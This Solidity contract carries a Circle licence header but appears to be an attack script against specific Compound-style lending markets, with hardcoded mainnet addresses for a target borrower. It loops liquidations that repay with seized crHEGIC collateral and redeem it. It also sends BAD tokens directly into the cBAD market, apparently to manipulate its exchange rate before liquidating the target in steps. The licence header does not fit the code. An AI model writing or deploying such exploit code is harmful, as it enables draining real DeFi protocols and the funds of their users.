/**
 * SPDX-License-Identifier: Apache-2.0
 *
 * Copyright (c) 2023, Circle Internet Financial, LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

pragma solidity 0.8.27;
import "hardhat/console.sol";

interface CTOKEN{
    function liquidateBorrow(address borrower, uint repayAmount, address cTokenCollateral) external returns (uint);
    function borrowBalanceStored(address account) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint); 
    function accrueInterest() external returns (uint);
}

interface CT{
    function getAllMarkets() external view returns (address[] memory);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface ERC20{
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function withdraw( uint requestedAmount) external;
}

contract OO{
    address KNC = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
    address OM = 0x3593D125a4f7849a1B059E64F4517A86Dd60c95d;
    address COM = 0x11c70CAA910647d820bD014d676Dcd97EDD64A99;
    address CKNC = 0x180087A6a87Fd6b09a78C9b9B87b71335906c61D;
    address CZH = 0x0C91F1795e012BCEF586C925F747f23B0969B5eA;
    address ZH = 0x837010619aeb2AE24141605aFC8f66577f6fb2e7;
    address rHEGIC = 0x47C0aD2aE6c0Ed4bcf7bc5b380D7205E89436e84;
    address crHEGIC = 0xB15e13Bc622315E29A7142fea3d0c67464B44e97;
    address controller = 0x606246e9EF6C70DCb6CEE42136cd06D127E2B7C7;
    address BAD = 0x3472A5A71965499acd81997a54BBA8D852C6E53d;
    address cBAD = 0x4A5B823592C2A1E95502C0b55afBa2397E71799d;

    //address TARGET = 0xe7E9EA373F253E71D12F6896785777A6a55189F4;
    address TARGET = 0xAc95E9DeC056835D88817A8A59A06B1667C515D7;
    uint start = 3*1e18;
    uint start1 = 41*1e16;
    uint start2 = 35*1e17;
    uint start3 = 2*1e17;
    uint start4 = 1*1e17;

    function st() public {
        ERC20(rHEGIC).approve(crHEGIC, type(uint256).max);
        ERC20(KNC).approve(CKNC, type(uint256).max);
        ERC20(ZH).approve(CZH, type(uint256).max);
        ERC20(BAD).approve(cBAD, type(uint256).max);
    }

    function fuck(uint k) public{
        CTOKEN(CKNC).liquidateBorrow(TARGET, start1, crHEGIC);
        CTOKEN(CKNC).liquidateBorrow(TARGET, start3, crHEGIC);
        //CTOKEN(CKNC).liquidateBorrow(TARGET, start4, crHEGIC);
        CTOKEN(CZH).liquidateBorrow(TARGET, start2, crHEGIC);
        uint crh = ERC20(crHEGIC).balanceOf(address(this));
        CTOKEN(crHEGIC).redeem(crh);
        uint rh = 0;
        for(uint i = 0;i<k ;i++){
            rh = ERC20(rHEGIC).balanceOf(address(this));
            console.log("rh",rh);
            CTOKEN(crHEGIC).liquidateBorrow(TARGET, rh, crHEGIC);
            crh = ERC20(crHEGIC).balanceOf(address(this));
            console.log("crh",crh);
            CTOKEN(crHEGIC).redeem(crh);
            
        }
        CTOKEN(crHEGIC).liquidateBorrow(TARGET,  ERC20(rHEGIC).balanceOf(address(this)), COM);
        console.log("aa",ERC20(COM).balanceOf(address(this)));
    }

    function bad() public{
        ERC20(BAD).transferFrom(msg.sender, address(this), 3788*1e18);
        ERC20(BAD).transfer(cBAD, 3600*1e18);
        uint a = 0;
        uint b = 0; 
        uint c = 0;
        (a,b,c) = CT(controller).getAccountLiquidity(0xAc95E9DeC056835D88817A8A59A06B1667C515D7);
        console.log("a:",ERC20(BAD).balanceOf(cBAD),b,c);
        
        CTOKEN(cBAD).accrueInterest();
        (a,b,c) = CT(controller).getAccountLiquidity(0xAc95E9DeC056835D88817A8A59A06B1667C515D7);
        console.log("a:",a,b,c);
        CTOKEN(cBAD).liquidateBorrow(TARGET, 94*1e18, COM);
        CTOKEN(cBAD).liquidateBorrow(TARGET, 47*1e18, COM);
        CTOKEN(cBAD).liquidateBorrow(TARGET, 23*1e18, COM);
        CTOKEN(cBAD).liquidateBorrow(TARGET, 11*1e18, COM);
        CTOKEN(cBAD).liquidateBorrow(TARGET, 5*1e18, COM);
        console.log("aa",ERC20(COM).balanceOf(address(this)));
    }

    function ff() public{
        address [] memory a = CT(controller).getAllMarkets();
        for(uint i =0;i<a.length;i++){
            uint b = CTOKEN(a[i]).borrowBalanceStored(0x5dbCcf75c2D698bE403D7c6888282b9ffC8766b1);
            if(b > 0){
                console.log(address(a[i]));
            }
        }
    }

    function ft() public{
        uint a = 0;
        uint b = 0; 
        uint c = 0;
        (a,b,c) = CT(controller).getAccountLiquidity(0xAc95E9DeC056835D88817A8A59A06B1667C515D7);
        console.log("a:",a,b,c);
        CTOKEN(0x4F905f75F5576228eD2D0EA508Fb0c32a0696090).accrueInterest();
        CTOKEN(0x0C91F1795e012BCEF586C925F747f23B0969B5eA).accrueInterest();
        CTOKEN(0x4E50972850822f8be8A034e23891B7063893Cc34).accrueInterest();
        CTOKEN(0x132E549262f2b2AD48AA306c3d389e55BB510419).accrueInterest();
        CTOKEN(0x4A5B823592C2A1E95502C0b55afBa2397E71799d).accrueInterest();
        (a,b,c) = CT(controller).getAccountLiquidity(0xAc95E9DeC056835D88817A8A59A06B1667C515D7);
        console.log("a:",a,b,c);

    }



    function liqudate(uint i) public{
        console.log("i",i);
        CTOKEN(crHEGIC).liquidateBorrow(TARGET, ERC20(rHEGIC).balanceOf(address(this)), crHEGIC);
        CTOKEN(crHEGIC).redeem(ERC20(crHEGIC).balanceOf(address(this)));
        console.log("rHEGIC:",ERC20(rHEGIC).balanceOf(address(this)));
    }

    receive() external payable { 

    }
}

